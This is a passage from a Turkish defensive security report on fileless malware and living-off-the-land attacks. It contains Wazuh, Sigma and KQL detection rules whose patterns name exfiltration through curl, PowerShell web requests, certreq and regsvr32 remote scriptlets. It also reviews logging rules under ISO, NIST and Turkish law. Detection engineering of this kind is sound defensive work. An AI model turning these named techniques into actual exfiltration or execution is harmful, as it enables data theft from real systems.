+      \<id\>T1567.002\</id\>  
+    \</mitre\>  
+  \</rule\>
+
+  \<\!-- Curl ile Veri Sızıntısı Tespiti (ID 100018\) \--\>  
+  \<rule id\="100018" level\="8"\>  
+    \<if\_sid\>61603\</if\_sid\>  
+    \<field name\="win.eventdata.originalFileName" type\="pcre2"\>(?i)(curl\\.exe)\</field\>  
+    \<field name\="win.eventdata.commandLine" type\="pcre2"\>(?i)(curl\\s+-T\\s+.\*C:\\\\.\*http)\</field\>  
+    \<options\>no\_full\_log\</options\>  
+    \<description\>Wazuh LOTL \- Curl kullanarak dış dünyaya veri sızdırma aktivitesi belirlendi\</description\>  
+    \<mitre\>  
+      \<id\>T1102\</id\>  
+      \<id\>T1567.002\</id\>  
+    \</mitre\>  
+  \</rule\>
+
+  \<\!-- PowerShell Web İsteği ile Veri Sızıntısı Tespiti (ID 100019\) \--\>  
+  \<rule id\="100019" level\="9"\>  
+    \<if\_sid\>60009\</if\_sid\>  
+    \<field name\="win.eventdata.contextInfo" type\="pcre2"\>(?i)Invoke-WebRequest\</field\>  
+    \<field name\="win.eventdata.payload" type\="pcre2"\>(?i)(Uri|http|Post|InFile|C:\\\\)\</field\>  
+    \<description\>Wazuh LOTL \- PowerShell Invoke-WebRequest ile şüpheli veri gönderme/sızdırma girişimi\</description\>  
+    \<mitre\>  
+      \<id\>T1059.001\</id\>  
+      \<id\>T1567.002\</id\>  
+    \</mitre\>  
+  \</rule\>
+
+  \<\!-- Certreq ile Şüpheli Veri Gönderimi Tespiti (ID 100020\) \--\>  
+  \<rule id\="100020" level\="9"\>  
+    \<if\_sid\>61603\</if\_sid\>  
+    \<field name\="win.eventdata.originalFileName" type\="pcre2"\>(?i)(certreq\\.exe)\</field\>  
+    \<field name\="win.eventdata.commandLine" type\="pcre2"\>(?i)(post|config|http|C:\\\\)\</field\>  
+    \<options\>no\_full\_log\</options\>  
+    \<description\>Wazuh LOTL \- Certreq.exe kullanılarak şüpheli HTTP POST/Veri Sızıntısı tespiti\</description\>  
+    \<mitre\>  
+      \<id\>T1102\</id\>  
+      \<id\>T1567.002\</id\>  
+    \</mitre\>  
+  \</rule\>  
+\</group\>
+
+### **5.3. Evrensel Tehdit Avcılığı: Sigma ve KQL Yaklaşımları**
+
+#### **Sigma Kuralı: Şüpheli PowerShell Kodlama ve Gizleme Parametreleri**
+
+Saldırganların komut satırı izleme mekanizmalarını atlatmak için kullandıkları karmaşık PowerShell komut parametre varyasyonlarını yakalayan evrensel Sigma kuralı21:
+
+YAML  
+title: Suspicious PowerShell Invocation Parameters  
+id: f4326b8e-7001-4991-881c-6190bebcf132  
+status: stable  
+description: Detects suspicious PowerShell execution options including base64 encoding, window hiding, and non-interactive profiles.  
+author: Cyber Security Solution Architect  
+logsource:  
+    product: windows  
+    category: process\_creation  
+detection:  
+    selection\_image:  
+        Image|endswith:  
+            \- '\\powershell.exe'  
+            \- '\\pwsh.exe'  
+    selection\_flags:  
+        CommandLine|contains:  
+            \- ' \-enc '  
+            \- ' \-EncodedCommand '  
+            \- ' \-ec '  
+            \- ' \-e '  
+            \- ' \-w hidden '  
+            \- ' \-windowstyle hidden '  
+            \- ' \-noni '  
+            \- ' \-noninteractive '  
+    filter\_azure:  
+        ParentImage|contains:  
+            \- 'C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\'  
+            \- '\\gc\_worker.exe'  
+    condition: selection\_image and selection\_flags and not filter\_azure  
+fields:  
+    \- CommandLine  
+    \- ParentImage  
+level: high  
+tags:  
+    \- attack.execution  
+    \- attack.t1059.001
+
+#### **Microsoft Sentinel KQL (Kusto Query Language) Sorgusu: Regsvr32 Squiblydoo ve Ağ Bağlantısı**
+
+Windows olay günlükleri ile ağ bağlantı olaylarını (Sysmon Event ID 3 veya DeviceNetworkEvents) birleştirerek, regsvr32.exe aracının internete çıkış yaptığı anomalileri tespit eden KQL korelasyonu3:
+
+Kod snippet'i  
+DeviceProcessEvents  
+| where ProcessVersionInfoOriginalFileName \=\~ @"regsvr32.exe"  
+| where CommandLine has\_any ("/i:http", "/i:https", "scrobj.dll")  
+| join kind=inner (  
+    DeviceNetworkEvents  
+    | where ProcessCommandLine has\_any ("regsvr32.exe")  
+    | where RemotePort in (80, 443, 8080\)  
+) on DeviceId, ProcessId  
+| project TimeGenerated, DeviceName, InitiatingProcessAccountName, CommandLine, RemoteIP, RemoteUrl, RemotePort  
+| order by TimeGenerated desc
+
+## **6\. Mevzuat ve Uluslararası Güvenlik Standartları Entegrasyonu**
+
+Dosyasız zararlı yazılım tespiti, bellek içi izleme ve loglama mimarileri, hem uluslararası siber güvenlik çerçevelerine hem de Türkiye Cumhuriyeti yasal mevzuatlarına uyum açısından zorunlu gereksinimler barındırır1.
+
+### **6.1. Uluslararası Standartlar**
+
+* **ISO 27001 (A.12.4 \- Günlük Kaydetme ve İzleme):** Güvenlik olay günlüklerinin eksiksiz tutulmasını, merkezi bir SIEM sisteminde toplanmasını ve kurcalanmaya karşı korunmasını emreder1.  
+* **CIS Controls (Control 8 \- Audit Log Management):** Kurum genelinde tüm uç noktalardan (sunucu ve istemci) zenginleştirilmiş komut satırı loglarının (CommandLine logging) toplanmasını ve merkezi olarak analiz edilmesini zorunlu kılar1.  
+* **NIST SP 800-53 (Kontrol Ailesi \- AU: Audit and Accountability):**  
+  * *AU-2 (Event Logging):* PowerShell script bloklarının (Event ID 4104\) ve WMI abonelik olaylarının (Event ID 19-21) olay listesine dahil edilmesini şart koşar12.  
+  * *AU-6 (Audit Record Review, Analysis, and Reporting):* Toplanan telemetrinin tehdit avcılığı (threat hunting) kuralları ve Sigma entegrasyonuyla düzenli olarak analiz edilmesini gerektirir14.  
+  * *AU-9 (Protection of Audit Information):* Log bütünlüğünün korunması amacıyla logların şifrelenmesini ve sadece yetkili siber güvenlik ekiplerine (RBAC) açılmasını kapsar1.  
+* **NIST SP 800-61 (Computer Security Incident Handling Guide):** Olay müdahale (Incident Response) aşamalarında, bellek içi enjeksiyon ve LOTL saldırılarının tespit edildiği durumlarda "canlı bellek analizi" (live memory forensics) yapılması gerektiğini, uç noktanın ağdan yalıtılarak (isolation) süreç dökümlerinin (process memory dump) alınması ve analiz edilmesini tavsiye eder1.
+
+### **6.2. Türkiye Yerel Mevzuat Uyum Analizi (KVKK, 5651 Sayılı Kanun, BDDK)**
+
+Türkiye siber güvenlik mevzuatına uyum, toplanan günlüklerin yasal niteliği ve veri minimizasyonu dengesi üzerine kuruludur1.
+
+#### **5651 Sayılı Kanun**
+
+Kurumlar, iç ağlarındaki kullanıcıların internet erişim kayıtlarını (IP adresi, MAC adresi, erişilen hedef IP/domain bilgileri vb.) kaydetmekle yükümlüdür1.
+
+* **Zaman Senkronizasyonu ve NTP Tutarlılığı:** Kanun kapsamında toplanan tüm logların tek bir zaman referansına (NTP sunucusu) bağlı olması zorunludur1. Aksi takdirde olayların oluş sırası ispatlanamaz ve hukuki geçerliliğini yitirir1.  
+* **Kriptografik Zaman Damgası:** 5651 Sayılı Kanun, internet trafik loglarının bütünlüğünün korunması amacıyla logların SHA-256 gibi kriptografik özetlerinin çıkarılıp resmi bir zaman damgasıyla imzalanmasını şart koşar1. Bu sayede mahkemede sunulan logların "değiştirilemezlik" (integrity) ilkesi güvence altına alınır1.  
+* **Saklama Süresi:** Kanun kapsamında trafik logları **en az 2 yıl** boyunca güvenli ve değiştirilemez şekilde saklanmalıdır49.
+
+#### **6698 Sayılı KVKK (Kişisel Verilerin Korunması Kanunu)**
+
+Toplanan siber güvenlik logları (kullanıcı hesapları, bilgisayar adları, kaynak IP adresleri) kişisel veri statüsündedir46.
+
+* **Meşru Menfaat ve Veri Minimizasyonu:** Siber olay tespiti için tutulan güvenlik logları, KVKK'ya göre "açık rıza" gerektirmeksizin "veri sorumlusunun meşru menfaati" hukuki dayanağıyla işlenebilir47. Ancak log kapsamı, sadece güvenlik analizi sınırları içinde tutulmalı (veri minimizasyonu), gereksiz kişisel aktiviteleri içermemelidir1.  
+* **Erişim Güvenliği (RBAC):** Toplanan log veri tabanına erişim, sadece yetkili SOC analistlerine "bilmesi gerektiği kadar" (need-to-know) yetkilendirme modeliyle verilmelidir1. Loglara erişenlerin faaliyetleri de ayrıca denetlenmelidir49.  
+* **Silme, Yok Etme ve Anonimleştirme:** Yasal saklama süreleri dolan (veya siber güvenlik analiz ömrünü tamamlayan) loglar, KVKK teknik tedbirler rehberine uygun olarak otomatik algoritmalarla güvenli bir şekilde silinmeli veya anonim hale getirilmelidir1.
+
+#### **BDDK / Siber Güvenlik Düzenlemeleri**
+
+Finans ve bankacılık sektöründeki kurumlar için BDDK, çok daha agresif siber güvenlik loglama ve izleme standartları uygulamaktadır1:
+
+* **Kesintisiz SOC Operasyonları (7/24 İzleme):** BDDK düzenlemeleri uyarınca finansal kurumlar, kritik sistemlerindeki ve uç noktalarındaki tüm siber tehditleri (WMI kalıcılıkları, süreç enjeksiyonları vb.) 24 saat kesintisiz olarak izleyen bir Güvenlik Operasyon Merkezi (SOC) kurmak veya dış kaynaklı profesyonel bir hizmetle bu süreci yönetmek zorundadır47.  
+* **Log Saklama Süresi:** BDDK siber güvenlik rehberleri kapsamında, siber olay analizine imkan tanımak amacıyla güvenlik loglarının ve zenginleştirilmiş olay günlüklerinin **en az 1 yıl** boyunca sıcak (active/searchable) ve analiz edilebilir durumda tutulmasını şart koşar47.  
+* **Sızma Testleri (Penetration Testing):** BDDK, kurumların yılda en az bir kez bağımsız sızma testleri yaptırmasını ve bu testlerin raporlarında dosyasız zararlı yazılımlar ile yanal hareket (Lateral Movement) açıklarının test edilmesini zorunlu tutmaktadır50.
+
+## **7\. Sonuç ve Stratejik Mimari Tavsiyeler**
+
+Dosyasız zararlı yazılımlar (Fileless Malware) ve yerleşik işletim sistemi bileşenlerinin kötüye kullanıldığı (LOTL) saldırı yöntemleri, siber savunma stratejilerinde köklü bir zihniyet değişimini zorunlu kılmaktadır2. Sadece diske temas eden tehditleri izleyen reaktif savunma modelleri, modern tehdit aktörlerini durdurmakta tamamen yetersiz kalmaktadır2.  
+Kıdemli bir Siber Güvenlik Çözüm Mimarı ve SOC Analisti gözüyle, kurumsal altyapıların bu tehlikeli vektörlere karşı dirençli hale getirilmesi amacıyla şu somut ve uygulanabilir stratejik adımların atılması önerilmektedir:
+
+1. **Uç Nokta Görünürlüğünün Maksimize Edilmesi:** Geleneksel antivirüs yazılımları, gelişmiş bellek içi enjeksiyon ve davranış analiz yeteneklerine sahip yeni nesil EDR (Endpoint Detection and Response) çözümleriyle değiştirilmelidir2. Sunucu ve istemci segmentlerinde Sysmon ve Auditd sensörleri aktif edilmeli; tüm komut satırı (CommandLine) parametreleri eksiksiz olarak toplanmalıdır13.  
+2. **Güvenli Sınırlandırma ve Uygulama Kontrolü:** LOLBAS kapsamında sıkça istismar edilen certutil.exe, mshta.exe ve regsvr32.exe gibi yerleşik araçların sıradan kullanıcı bilgisayarlarında çalıştırılması Windows Defender Application Control (WDAC) veya AppLocker politikaları ile tamamen engellenmeli veya kısıtlanmalıdır3. İnternet çıkış ihtiyacı olmayan sistem araçlarının dış dünyayla iletişim kurması host-based firewall kuralları ile bloke edilmelidir3.  
+3. **PowerShell ve .NET Altyapısının Sertleştirilmesi (Hardening):** Kurum genelinde PowerShell v2 sürümü tamamen devre dışı bırakılarak geriye dönük sürüm düşürme (downgrade) saldırıları engellenmelidir20. PowerShell v5+ ile gelen "Gelişmiş Betik Bloğu Loglaması" (Script Block Logging) ve AMSI (Antimalware Scan Interface) entegrasyonu zorunlu hale getirilmeli, bu loglar gerçek zamanlı olarak SIEM platformuna yönlendirilmelidir7.  
+4. **WMI Deposu ve Kalıcılık Denetimi:** WMI kalıcı olay abonelikleri (\_\_EventFilter, \_\_EventConsumer) düzenli aralıklarla (haftalık/aylık otomatik scriptler yardımıyla) taranmalı ve baseline (normal durum) dışındaki tüm kalıcılık nesneleri sistemlerden temizlenmelidir25.  
+5. **Yasal Uyum ve Log Bütünlüğü:** Toplanan tüm denetim izleri, Türkiye Cumhuriyeti yasal mevzuatlarına (5651 Sayılı Kanun, KVKK, BDDK) uygun olarak NTP zaman senkronizasyonu altında toplanmalı, zaman damgasıyla kriptografik olarak mühürlenmeli ve erişim kontrolü rollere (RBAC) bölünerek yasal saklama sürelerince (en az 1-2 yıl) muhafaza edilmelidir1.
+
+#### **Alıntılanan çalışmalar**
+
+1. 5651 ve KVKK Uyumlu Log Tutma \- Mikroes Bilişim, [https://mikroes.com/5651-ve-kvkk-uyumlu-log-tutma/](https://mikroes.com/5651-ve-kvkk-uyumlu-log-tutma/)  
+2. Memory Injection: Definition and Key Concepts \- SecurView, [https://www.securview.com/ai-security-essentials/memory-injection](https://www.securview.com/ai-security-essentials/memory-injection)  
+3. LOLBins in 2026: How Attackers Use Windows Against Itself \- Hive Security, [https://hivesecurity.gitlab.io/blog/lolbins-living-off-the-land-windows-2026/](https://hivesecurity.gitlab.io/blog/lolbins-living-off-the-land-windows-2026/)  
+4. Malware Unchained — Part 3: Reflective DLL Injection — Running Code Without Leaving a Trace | by ANKUR KUMAR | Medium, [https://medium.com/@Ankur404k/%EF%B8%8F-malware-unchained-part-3-process-hollowing-ghost-in-the-process-5a5e827df006](https://medium.com/@Ankur404k/%EF%B8%8F-malware-unchained-part-3-process-hollowing-ghost-in-the-process-5a5e827df006)  
+5. Living Off The Land (LOTL) Attacks and Techniques \- Fortinet, [https://www.fortinet.com/resources/cyberglossary/living-off-the-land-lotl](https://www.fortinet.com/resources/cyberglossary/living-off-the-land-lotl)  
+6. What are "Living of the Land Attacks" (aka LOL, LOTL, LOLbin, LOLBAS...) \- Reddit, [https://www.reddit.com/r/cybersecurity/comments/1j2glqk/what\_are\_living\_of\_the\_land\_attacks\_aka\_lol\_lotl/](https://www.reddit.com/r/cybersecurity/comments/1j2glqk/what_are_living_of_the_land_attacks_aka_lol_lotl/)  
+7. Guide to threat hunting Hunting LOLBins/GTFOBins \- CyberLeveling, [https://cyberleveling.com/blog/hunting-lolbins-gtfobins](https://cyberleveling.com/blog/hunting-lolbins-gtfobins)  
+8. Living off the Land Attacks (aka LOL, LOTL, LOLbin, LOLBAS…)– Bitdefender TechZone, [https://techzone.bitdefender.com/en/tech-explainers/living-of-the-land-attacks.html](https://techzone.bitdefender.com/en/tech-explainers/living-of-the-land-attacks.html)  
+9. WMI Malware: The Complete Forensics Guide \- Cyber Triage, [https://www.cybertriage.com/blog/wmi-malware/](https://www.cybertriage.com/blog/wmi-malware/)  
+10. Boost Your SOC Skills: How to Detect Good Apps Gone Bad \- Intezer, [https://intezer.com/blog/boost-your-soc-skills-how-to-detect-good-apps-gone-bad/](https://intezer.com/blog/boost-your-soc-skills-how-to-detect-good-apps-gone-bad/)  
+11. Introduction to Sigma Rules and Detection of Credential Harvesting \- Recorded Future, [https://assets.recordedfuture.com/insikt-report-pdfs/2021/cta-2021-0308.pdf](https://assets.recordedfuture.com/insikt-report-pdfs/2021/cta-2021-0308.pdf)  
+12. Catch Malware Hiding in WMI with Sysmon | Netsurion, [https://www.netsurion.com/articles/catch-malware-hiding-in-wmi-with-sysmon](https://www.netsurion.com/articles/catch-malware-hiding-in-wmi-with-sysmon)  
+13. Sysmon Overview \- Microsoft Learn, [https://learn.microsoft.com/en-us/windows/security/operating-system-security/sysmon/overview](https://learn.microsoft.com/en-us/windows/security/operating-system-security/sysmon/overview)  
+14. Hunting Fileless Malware: A Technical Dive with Sysmon and MITRE ATT\&CK \- Medium, [https://medium.com/@DamagedRoot/hunting-fileless-malware-a-technical-dive-with-sysmon-and-mitre-att-ck-971fc0c147f3](https://medium.com/@DamagedRoot/hunting-fileless-malware-a-technical-dive-with-sysmon-and-mitre-att-ck-971fc0c147f3)  
+15. Process Injection Techniques \- Cynet, [https://www.cynet.com/security-foundations/attack-techniques/process-injection-techniques/](https://www.cynet.com/security-foundations/attack-techniques/process-injection-techniques/)  
+16. Memory Injection in Malware: How It Works Under the Hood | by CCEE \- Medium, [https://medium.com/@ccee.srmistrmp/memory-injection-in-malware-how-it-works-under-the-hood-e3648435980c](https://medium.com/@ccee.srmistrmp/memory-injection-in-malware-how-it-works-under-the-hood-e3648435980c)  
+17. Process Injection: Dynamic-link Library Injection, Sub-technique T1055.001 \- Enterprise | MITRE ATT\&CK®, [https://attack.mitre.org/techniques/T1055/001/](https://attack.mitre.org/techniques/T1055/001/)  
+18. Hunting Living off the Land Attacks with Wazuh | Medium, [https://enescayvarli.medium.com/hunting-living-off-the-land-attacks-with-wazuh-0cbe0b7f51d5](https://enescayvarli.medium.com/hunting-living-off-the-land-attacks-with-wazuh-0cbe0b7f51d5)  
+19. PowerShell (T1059.001) | MITRE ATT\&CK \- Startup Defense, [https://www.startupdefense.io/mitre-attack-techniques/t1059-001-powershell](https://www.startupdefense.io/mitre-attack-techniques/t1059-001-powershell)  
+20. alerting-detection-strategy-framework/ADS-Examples/004-Unusual-Powershell-Host-Process.md at master \- GitHub, [https://github.com/palantir/alerting-detection-strategy-framework/blob/master/ADS-Examples/004-Unusual-Powershell-Host-Process.md](https://github.com/palantir/alerting-detection-strategy-framework/blob/master/ADS-Examples/004-Unusual-Powershell-Host-Process.md)  
+21. sigma/rules/windows/process\_creation/proc\_creation\_win\_powershell\_encode.yml at master \- GitHub, [https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process\_creation/proc\_creation\_win\_powershell\_encode.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_encode.yml)  
+22. Unmanaged PowerShell Binaries and Endpoint Protection \- Optiv, [https://www.optiv.com/explore-optiv-insights/blog/unmanaged-powershell-binaries-and-endpoint-protection](https://www.optiv.com/explore-optiv-insights/blog/unmanaged-powershell-binaries-and-endpoint-protection)  
+23. Cobalt Strike 3.3 – Now with less PowerShell.exe, [https://www.cobaltstrike.com/blog/cobalt-strike-3-3-now-with-less-powershell-exe](https://www.cobaltstrike.com/blog/cobalt-strike-3-3-now-with-less-powershell-exe)  
+24. Threat Thursday: APT35 \- Scythe.io, [https://scythe.io/scythe-labs/threat-actor-apt35](https://scythe.io/scythe-labs/threat-actor-apt35)  
+25. Persistence via WMI Event Subscription | Prebuilt detection rules reference \- Elastic, [https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/persistence\_via\_windows\_management\_instrumentation\_event\_subscription](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/persistence_via_windows_management_instrumentation_event_subscription)  
+26. Remote WMI ActiveScriptEventConsumers \- Threat Hunter Playbook, [https://threathunterplaybook.com/hunts/windows/200902-RemoteWMIActiveScriptEventConsumers/notebook.html](https://threathunterplaybook.com/hunts/windows/200902-RemoteWMIActiveScriptEventConsumers/notebook.html)  
+27. Suspicious WMI Event Subscription Created | Prebuilt detection rules reference \- Elastic, [https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/persistence\_sysmon\_wmi\_event\_subscription](https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/windows/persistence_sysmon_wmi_event_subscription)  
+28. Anthropic-Cybersecurity-Skills/skills/hunting-for-persistence-via-wmi-subscriptions/SKILL.md at main \- GitHub, [https://github.com/mukul975/Anthropic-Cybersecurity-Skills/blob/main/skills/hunting-for-persistence-via-wmi-subscriptions/SKILL.md](https://github.com/mukul975/Anthropic-Cybersecurity-Skills/blob/main/skills/hunting-for-persistence-via-wmi-subscriptions/SKILL.md)  
+29. How to Find WMI Consumers: Complete Guide for IT \+ Investigators \- Cyber Triage, [https://www.cybertriage.com/blog/how-to-find-wmi-consumers/](https://www.cybertriage.com/blog/how-to-find-wmi-consumers/)  
+30. hunting-for-lolbins-execution-in-endpoint-logs \- LobeHub, [https://lobehub.com/skills/mukul975-anthropic-cybersecurity-skills-hunting-for-lolbins-execution-in-endpoint-logs](https://lobehub.com/skills/mukul975-anthropic-cybersecurity-skills-hunting-for-lolbins-execution-in-endpoint-logs)  
+31. GTFOBins, [https://gtfobins.org/](https://gtfobins.org/)  
+32. ayeheinzayar/Sigma4GTFOBins: Sigma rules for GTFOBins linux command detection \- GitHub, [https://github.com/ayeheinzayar/Sigma4GTFOBins](https://github.com/ayeheinzayar/Sigma4GTFOBins)  
+33. How to Audit Privileged Command Execution on RHEL \- OneUptime, [https://oneuptime.com/blog/post/2026-03-04-audit-privileged-command-execution-rhel-9/view](https://oneuptime.com/blog/post/2026-03-04-audit-privileged-command-execution-rhel-9/view)  
+34. GTFOArgs: Argument Injection Exploitation Vector List | GTFOArgs is a curated list of Unix binaries whose arguments can be exploited for argument injection, enabling shell escapes, privilege escalation, file read/write, and other post-exploitation techniques., [https://gtfoargs.github.io/](https://gtfoargs.github.io/)  
+35. Detecting Living-off-the-Land (LOLBAS) Attacks with Sigma Rules | by ATNO For Cybersecurity | Hacking | Medium, [https://medium.com/@atnoforcybersecurity/detecting-living-off-the-land-lolbas-attacks-with-sigma-rules-340e441fc444](https://medium.com/@atnoforcybersecurity/detecting-living-off-the-land-lolbas-attacks-with-sigma-rules-340e441fc444)  
+36. Suspicious Regsvr32 Execution From Remote Share \- Detection.FYI, [https://detection.fyi/sigmahq/sigma/windows/process\_creation/proc\_creation\_win\_regsvr32\_remote\_share/](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_regsvr32_remote_share/)  
+37. Beyond PowerShell: Analyzing the Multi-Action ClickFix Variant \- CyberProof, [https://www.cyberproof.com/blog/beyond-powershell-analyzing-the-multi-action-clickfix-variant/](https://www.cyberproof.com/blog/beyond-powershell-analyzing-the-multi-action-clickfix-variant/)  
+38. Analytics Story: Linux Living Off The Land | Splunk Security Content, [https://research.splunk.com/stories/linux\_living\_off\_the\_land](https://research.splunk.com/stories/linux_living_off_the_land)  
+39. Building a Detection Foundation: Part 4 \- Sysmon \- TrustedSec, [https://trustedsec.com/blog/building-a-detection-foundation-part-4-sysmon](https://trustedsec.com/blog/building-a-detection-foundation-part-4-sysmon)  
+40. Linux detection engineering with Auditd — Elastic Security Labs, [https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd](https://www.elastic.co/security-labs/linux-detection-engineering-with-auditd)  
+41. Detecting Data Exfiltration Using Living Off the Land Tools with Wazuh \- CoreWin, [https://corewin.ua/en/blog-en/detecting-data-exfiltration-using-living-off-the-land-tools-with-wazuh/](https://corewin.ua/en/blog-en/detecting-data-exfiltration-using-living-off-the-land-tools-with-wazuh/)  
+42. Detecting data exfiltration using Living Off the Land tools with Wazuh, [https://wazuh.com/blog/detecting-data-exfiltration-using-living-off-the-land-tools-with-wazuh/](https://wazuh.com/blog/detecting-data-exfiltration-using-living-off-the-land-tools-with-wazuh/)  
+43. sigma/rules/windows/powershell/powershell\_script/posh\_ps\_susp\_invocation\_generic.yml at master \- GitHub, [https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell\_script/posh\_ps\_susp\_invocation\_generic.yml](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_script/posh_ps_susp_invocation_generic.yml)  
+44. KVKK 5651 Sayılı Kanun Kapsamında Uyum Rehberi \- Nesil Teknoloji, [https://www.nesilteknoloji.com/5651-sayili-kanun-ve-loglama/](https://www.nesilteknoloji.com/5651-sayili-kanun-ve-loglama/)  
+45. Siber Güvenlik SSS | Sık Sorulan Sorular \- Secunnix, [https://scnx.com/sss](https://scnx.com/sss)  
+46. Sigma: The Universal Language for Threat Detection 🛡️ | by Furkanctiner \- Medium, [https://medium.com/@furkanctiner/sigma-the-universal-language-for-threat-detection-%EF%B8%8F-0fdca3e4fd9d](https://medium.com/@furkanctiner/sigma-the-universal-language-for-threat-detection-%EF%B8%8F-0fdca3e4fd9d)  
+47. Şirketler Neden 5651 Sayılı Yasa ve KVKK Uyumlu Log Tutmalı? \- Berqnet, [https://berqnet.com/blog/sirketler-neden-5651-sayili-yasa-ve-kvkk-uyumlu-log-tutmali](https://berqnet.com/blog/sirketler-neden-5651-sayili-yasa-ve-kvkk-uyumlu-log-tutmali)  
+48. BDDK Sızma Testi Zorunluluğu: Bankalar Ne Yapmalı? \- Nordis Global, [https://www.nordisglobal.com/blog/bddk-sizma-testi-zorunlulugu-bankalar-ne-yapmali/](https://www.nordisglobal.com/blog/bddk-sizma-testi-zorunlulugu-bankalar-ne-yapmali/)
